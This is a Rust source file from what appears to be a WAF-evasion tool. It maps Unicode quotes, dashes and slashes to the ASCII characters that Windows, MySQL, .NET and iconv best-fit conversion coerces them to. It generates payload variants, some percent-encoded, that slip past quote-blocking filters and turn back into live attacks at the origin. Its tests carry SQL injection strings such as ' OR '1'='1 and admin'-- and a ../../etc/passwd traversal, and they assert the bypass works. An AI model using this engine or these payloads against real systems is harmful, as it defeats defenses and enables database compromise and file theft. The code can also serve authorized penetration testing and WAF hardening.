//! Best-fit / charset down-conversion homoglyph engine — the complement to
//! [`super::nfkc_preimage`].
//!
//! ## Best-fit ≠ NFKC
//!
//! NFKC folds *compatibility* variants (styled letters, fullwidth). It does
//! **not** touch typographic punctuation — `'` (U+2019 RIGHT SINGLE QUOTATION
//! MARK) has no NFKC decomposition and survives unchanged. But a large class of
//! origins perform **best-fit** charset coercion when they down-convert Unicode
//! to a legacy/ANSI codepage:
//!
//! * Windows `WideCharToMultiByte` *without* `WC_NO_BEST_FIT_CHARS` (the
//!   default) maps `' ' ‚ ′` → `'`, `" " „ ″` → `"`, `– — −` → `-`, etc.
//! * MySQL silently coerces many Unicode punctuation codepoints to their ASCII
//!   equivalent when the column/connection charset is latin1/ascii.
//! * .NET `Encoding.GetEncoding(1252)` best-fit, many CSV/Excel importers, and
//!   PHP `iconv("//TRANSLIT")` do the same.
//!
//! This is the canonical **best-fit SQL-injection** primitive: a WAF blocks the
//! literal `'`, but `'` (a curly quote) sails past and the origin coerces it
//! back to `'`, breaking out of the string and firing the injection. NFKC-based
//! engines miss it entirely.
//!
//! The mapping below is a sourced subset of the Windows-1252 best-fit table +
//! the common cross-origin punctuation coercions. It is **Tier-B data**: append
//! a `(codepoint, ascii)` pair to extend coverage. Soundness is enforced by the
//! shared `super::homoglyph_gen` gate — every emitted variant best-fit-folds
//! back to the exact attack under [`normalize`].

use std::collections::HashMap;
use std::sync::OnceLock;

/// Forward best-fit map: `(origin codepoint, ASCII it coerces to)`.
///
/// Sourced from the Windows best-fit tables (CP1252 `bestfit1252.txt` /
/// `WideCharToMultiByte` default behaviour) and MySQL/.NET/iconv punctuation
/// coercion. Deliberately punctuation-only — best-fit's exploit value is the
/// quote/dash/space coercions that defeat string-delimiter WAF rules; letter
/// homoglyphs are [`super::nfkc_preimage`]'s job.
const BEST_FIT: &[(char, char)] = &[
    // → apostrophe / single quote (the SQLi string-breakout gold)
    ('\u{2018}', '\''), // ' LEFT SINGLE QUOTATION MARK
    ('\u{2019}', '\''), // ' RIGHT SINGLE QUOTATION MARK
    ('\u{201A}', '\''), // ‚ SINGLE LOW-9 QUOTATION MARK
    ('\u{201B}', '\''), // ‛ SINGLE HIGH-REVERSED-9
    ('\u{2032}', '\''), // ′ PRIME
    ('\u{02B9}', '\''), // ʹ MODIFIER LETTER PRIME
    ('\u{02BC}', '\''), // ʼ MODIFIER LETTER APOSTROPHE
    ('\u{00B4}', '\''), // ´ ACUTE ACCENT
    ('\u{FF07}', '\''), // ＇ FULLWIDTH APOSTROPHE
    // → double quote
    ('\u{201C}', '"'), // " LEFT DOUBLE QUOTATION MARK
    ('\u{201D}', '"'), // " RIGHT DOUBLE QUOTATION MARK
    ('\u{201E}', '"'), // „ DOUBLE LOW-9 QUOTATION MARK
    ('\u{201F}', '"'), // ‟ DOUBLE HIGH-REVERSED-9
    ('\u{2033}', '"'), // ″ DOUBLE PRIME
    ('\u{FF02}', '"'), // ＂ FULLWIDTH QUOTATION MARK
    // → backtick (MySQL identifier quoting / template literals)
    ('\u{2035}', '`'), // ‵ REVERSED PRIME
    ('\u{FF40}', '`'), // ｀ FULLWIDTH GRAVE ACCENT
    // → hyphen-minus (SQL comment `--`, option injection `-`)
    ('\u{2010}', '-'), // ‐ HYPHEN
    ('\u{2011}', '-'), // ‑ NON-BREAKING HYPHEN
    ('\u{2012}', '-'), // ‒ FIGURE DASH
    ('\u{2013}', '-'), // – EN DASH
    ('\u{2014}', '-'), // — EM DASH
    ('\u{2015}', '-'), // ― HORIZONTAL BAR
    ('\u{2212}', '-'), // − MINUS SIGN
    ('\u{FF0D}', '-'), // － FULLWIDTH HYPHEN-MINUS
    // → forward slash — path traversal `/`, scheme `//`, SQL `/**/`. NFKC
    //   leaves these alone; best-fit / confusable coercion maps them to `/`.
    ('\u{2044}', '/'), // ⁄ FRACTION SLASH
    ('\u{2215}', '/'), // ∕ DIVISION SLASH
    // → backslash — Windows path traversal `..\`.
    ('\u{2216}', '\\'), // ∖ SET MINUS
];

/// Apply the best-fit coercion to `s` — the *origin-side* transform. Exposed so
/// callers can model "what the best-fit-coercing origin sees".
#[must_use]
pub fn normalize(s: &str) -> String {
    let fwd = forward_map();
    s.chars()
        .map(|c| fwd.get(&c).copied().unwrap_or(c))
        .collect()
}

fn forward_map() -> &'static HashMap<char, char> {
    static MAP: OnceLock<HashMap<char, char>> = OnceLock::new();
    MAP.get_or_init(|| BEST_FIT.iter().copied().collect())
}

/// Inverse best-fit map: ASCII char → codepoints that best-fit-coerce to it.
fn preimage_map() -> &'static HashMap<char, Vec<char>> {
    static MAP: OnceLock<HashMap<char, Vec<char>>> = OnceLock::new();
    MAP.get_or_init(|| {
        let mut m: HashMap<char, Vec<char>> = HashMap::new();
        for &(cp, ascii) in BEST_FIT {
            m.entry(ascii).or_default().push(cp);
        }
        m
    })
}

/// Generate up to `max` best-fit variants of `payload`. Every returned string
/// best-fit-folds back to the exact attack (`normalize(v) == payload`) yet
/// carries none of the literal delimiter bytes a WAF policed.
#[must_use]
pub fn variants(payload: &str, max: usize) -> Vec<String> {
    super::homoglyph_gen::generate(payload, max, preimage_map(), normalize)
}

/// How many codepoints best-fit-coerce to `c`.
#[must_use]
pub fn preimage_count(c: char) -> usize {
    preimage_map().get(&c).map_or(0, Vec::len)
}

/// The canonical codepoint that best-fit-coerces to `c` (the per-character
/// dual of [`normalize`]), or `None` when `c` has no best-fit preimage.
/// `normalize(&first_preimage(c)?.to_string()) == c.to_string()`. The wafmodel
/// solver uses it as the structural inverse of a best-fit-down-converting sink,
/// reusing this engine's map rather than copying it (NO-DUP contract).
#[must_use]
pub fn first_preimage(c: char) -> Option<char> {
    preimage_map().get(&c).and_then(|v| v.first()).copied()
}

/// Layered best-fit + percent-encoding variants — a best-fit variant that is
/// *also* `%XX`-encoded. See `super::homoglyph_gen::generate_composed`. Only
/// an origin that url-decodes THEN best-fit-coerces reconstructs the injection.
#[must_use]
pub fn composed_variants(payload: &str, max: usize) -> Vec<String> {
    super::homoglyph_gen::generate_composed(payload, max, preimage_map(), normalize)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn nfkc_does_not_fold_curly_quotes_but_bestfit_does() {
        // The whole reason this engine exists: NFKC leaves the curly quote
        // alone; best-fit coerces it to ASCII `'`.
        assert_eq!(
            super::super::nfkc_preimage::normalize("\u{2019}"),
            "\u{2019}"
        );
        assert_eq!(normalize("\u{2019}"), "'");
        assert!(
            preimage_count('\'') >= 5,
            "apostrophe needs the curly-quote family"
        );
        assert!(preimage_count('"') >= 4);
        assert!(preimage_count('-') >= 6);
    }

    #[test]
    fn bestfit_covers_slash_and_backslash_nfkc_leaves_alone() {
        // Path-traversal `/` and Windows `..\`: NFKC does not fold the division/
        // fraction slash or set-minus; best-fit / confusable coercion does.
        assert_eq!(
            super::super::nfkc_preimage::normalize("\u{2215}"),
            "\u{2215}"
        );
        assert_eq!(normalize("\u{2215}"), "/");
        assert_eq!(normalize("\u{2044}"), "/");
        assert_eq!(normalize("\u{2216}"), "\\");
        let vs = variants("../../etc/passwd", 16);
        let v = vs
            .iter()
            .find(|v| !v.contains('/'))
            .expect("a variant must hide the literal forward slash");
        assert_eq!(
            normalize(v),
            "../../etc/passwd",
            "origin best-fit recovers the path"
        );
    }

    #[test]
    fn every_variant_bestfit_folds_to_the_attack() {
        // SOUNDNESS: each variant coerces back to the exact SQLi payload.
        for attack in [
            "' OR '1'='1",
            "admin'--",
            "1' UNION SELECT--",
            "\" OR \"\"=\"",
        ] {
            let vs = variants(attack, 24);
            assert!(!vs.is_empty(), "no variants for {attack:?}");
            for v in &vs {
                assert_eq!(normalize(v), attack, "UNSOUND best-fit variant {v:?}");
                assert_ne!(v, attack);
            }
        }
    }

    #[test]
    fn defeats_a_quote_blocking_waf_while_origin_recovers_the_injection() {
        // A SQLi WAF flags the literal single quote; the curly-quote variant
        // carries none, and the best-fit origin restores it → injection fires.
        let attack = "' OR 1=1--";
        let vs = variants(attack, 16);
        assert!(!vs.is_empty());
        let bypass = vs
            .iter()
            .find(|v| !v.contains('\'') && !v.contains('-'))
            .expect("a variant must hide both the quote and the comment dashes");
        assert_eq!(
            normalize(bypass),
            attack,
            "origin best-fit must recover the injection"
        );
    }

    #[test]
    fn composed_layer_hides_quote_under_percent_and_origin_recovers_it() {
        let attack = "' OR 1=1--";
        let vs = composed_variants(attack, 12);
        assert!(!vs.is_empty());
        for v in &vs {
            assert!(
                v.contains('%'),
                "composed form must carry a percent layer: {v:?}"
            );
            // A best-fit-coercing WAF that does NOT url-decode sees inert %XX.
            assert_ne!(normalize(v), attack);
            // Origin: url-decode THEN best-fit recovers the injection.
            let decoded = urlencoding::decode(v)
                .map(|c| c.into_owned())
                .unwrap_or_default();
            assert_eq!(normalize(&decoded), attack);
        }
    }

    #[test]
    fn no_punctuation_yields_nothing() {
        // Letters/digits have no best-fit preimage here (that's NFKC's domain).
        assert!(variants("union select", 8).is_empty());
    }

    #[test]
    fn deterministic_and_bounded() {
        assert_eq!(variants("' OR 1=1--", 12), variants("' OR 1=1--", 12));
        assert!(variants("' OR 1=1--", 3).len() <= 3);
    }

    #[test]
    fn first_preimage_is_a_sound_single_char_inverse() {
        // The structural inverse the wafmodel solver composes for a best-fit
        // sink: the canonical preimage of each delimiter coerces back to it.
        for c in ['\'', '"', '-', '/', '\\', '`'] {
            let p = first_preimage(c).expect("delimiter must have a best-fit preimage");
            assert_ne!(p, c, "preimage of {c:?} is the char itself");
            assert!(!p.is_ascii(), "a best-fit preimage must be non-ASCII");
            assert_eq!(
                normalize(&p.to_string()),
                c.to_string(),
                "best-fit({p:?}) != {c:?}"
            );
        }
        // The SQLi gold: the single quote resolves to the curly-quote family.
        assert_eq!(first_preimage('\''), Some('\u{2018}'));
        // Letters/digits are NFKC's domain, not best-fit's.
        assert_eq!(first_preimage('a'), None);
        assert_eq!(first_preimage('1'), None);
    }
}
